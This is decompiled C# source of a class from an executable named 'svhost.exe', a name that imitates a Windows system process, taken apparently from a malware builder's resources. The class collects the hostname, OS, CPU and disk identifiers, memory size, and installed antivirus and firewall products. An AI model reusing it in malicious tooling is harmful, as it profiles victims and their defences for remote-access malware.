// Decompiled with JetBrains decompiler
// Type: svhost.info
// Assembly: svhost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7DC793DB-CF4C-4ECD-BC3A-2E8425BD618A
// Assembly location: C:\Users\matze\Desktop\Neuer Ordner (7)\Builder\Builder\Resources\svhost.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using svhost.My;
using System;
using System.Collections;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;

namespace svhost
{
  public class info
  {
    public string PC_Name;
    public string OS;
    public static Computer pc = new Computer();

    public info()
    {
      this.PC_Name = Dns.GetHostName();
      this.OS = MyProject.Computer.Info.OSFullName.ToString();
    }

    public static string HWID()
    {
      string empty = string.Empty;
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher((ObjectQuery) new SelectQuery("Win32_processor"));
      try
      {
        foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
          empty = managementBaseObject["processorId"].ToString();
      }
      finally
      {
        ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
        objectEnumerator?.Dispose();
      }
      return empty;
    }

    public static string SNHD()
    {
      string str1 = "";
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_DiskDrive");
      string str2;
      try
      {
        ManagementObjectCollection.ManagementObjectEnumerator enumerator;
        try
        {
          enumerator = managementObjectSearcher.Get().GetEnumerator();
          if (enumerator.MoveNext())
          {
            str1 = enumerator.Current["SerialNumber"].ToString().Trim();
            str2 = str1;
            goto label_9;
          }
        }
        finally
        {
          enumerator?.Dispose();
        }
      }
      catch (ManagementException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        str2 = "";
        ProjectData.ClearProjectError();
        goto label_9;
      }
      str2 = str1;
label_9:
      return str2;
    }

    public static string GetAntivirus()
    {
      string str1 = string.Empty;
      try
      {
        string machineName = Environment.MachineName;
        ManagementObjectCollection objectCollection = new ManagementObjectSearcher(Conversions.ToString(Interaction.IIf(Environment.OSVersion.Version.Major > 5, (object) ("\\\\" + machineName + "\\root\\SecurityCenter2"), (object) ("\\\\" + machineName + "\\root\\SecurityCenter"))), "SELECT * FROM AntivirusProduct").Get();
        string str2 = "Antiviruses (" + objectCollection.Count.ToString() + "):\r\n";
        try
        {
          foreach (ManagementObject managementObject in objectCollection)
          {
            try
            {
              str2 = Conversions.ToString(Operators.AddObject((object) str2, Operators.ConcatenateObject(managementObject["companyName"], (object) " - ")));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              str2 = Conversions.ToString(Operators.ConcatenateObject((object) str2, Operators.ConcatenateObject(Operators.ConcatenateObject(managementObject["displayName"], (object) "\r"), (object) "\n")));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        finally
        {
          ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
          objectEnumerator?.Dispose();
        }
        str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (str1.Contains(":"))
        str1 = str1.Split(':')[1].TrimStart().TrimEnd();
      return str1;
    }

    public static string GetFirewall()
    {
      string str = "None";
      try
      {
        ManagementObjectCollection objectCollection = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM FirewallProduct").Get();
        try
        {
          foreach (ManagementBaseObject managementBaseObject in objectCollection)
            str = managementBaseObject["displayName"].ToString();
        }
        finally
        {
          ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
          objectEnumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string GetOS()
    {
      string[] strArray = new string[0];
      object Instance = (object) new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
      try
      {
        foreach (object obj in (IEnumerable) NewLateBinding.LateGet(Instance, (Type) null, "Get", new object[0], (string[]) null, (Type[]) null, (bool[]) null))
          strArray = NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(obj), new object[1]
          {
            (object) "name"
          }, (string[]) null).ToString().Split('|');
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return Conversions.ToString(Interaction.IIf(strArray[0] != null, (object) strArray[0], (object) "Unknown"));
    }

    public static string GetProcessor()
    {
      string empty = string.Empty;
      string str;
      try
      {
        object objectValue1 = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:"));
        try
        {
          foreach (object obj in (IEnumerable) NewLateBinding.LateGet(objectValue1, (Type) null, "InstancesOf", new object[1]
          {
            (object) "Win32_Processor"
          }, (string[]) null, (Type[]) null, (bool[]) null))
          {
            object objectValue2 = RuntimeHelpers.GetObjectValue(obj);
            empty = Conversions.ToString(Operators.ConcatenateObject((object) empty, NewLateBinding.LateGet(objectValue2, (Type) null, "Name", new object[0], (string[]) null, (Type[]) null, (bool[]) null)));
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        str = empty;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "No Processor was found";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string GetMemory()
    {
      string str = Conversions.ToString(info.pc.Info.TotalPhysicalMemory);
      Decimal d1 = Conversions.ToDecimal(str);
      if (Decimal.Compare(d1, 0M) >= 0 && Decimal.Compare(d1, 999.999M) <= 0)
        str = Strings.Format((object) Convert.ToInt32(Conversions.ToDecimal(str)), "###,###,###,###,##0 bytes");
      else if (Decimal.Compare(d1, 1000M) >= 0 && Decimal.Compare(d1, 999999.999M) <= 0)
        str = Strings.Format((object) Convert.ToInt32(Decimal.Divide(Conversions.ToDecimal(str), 1024M)), "###,###,###,##0 KB");
      else if (Decimal.Compare(d1, 1000000M) >= 0 && Decimal.Compare(d1, 999999999.999M) <= 0)
        str = Strings.Format((object) Convert.ToInt32(Decimal.Divide(Decimal.Divide(Conversions.ToDecimal(str), 1024M), 1024M)), "###,###,##0 MB");
      else if (Decimal.Compare(d1, 1000000000M) >= 0)
        str = Strings.Format((object) Convert.ToInt32(Decimal.Divide(Decimal.Divide(Decimal.Divide(Conversions.ToDecimal(str), 1024M), 1024M), 1024M)), "#,###.00 GB");
      return str;
    }
  }
}
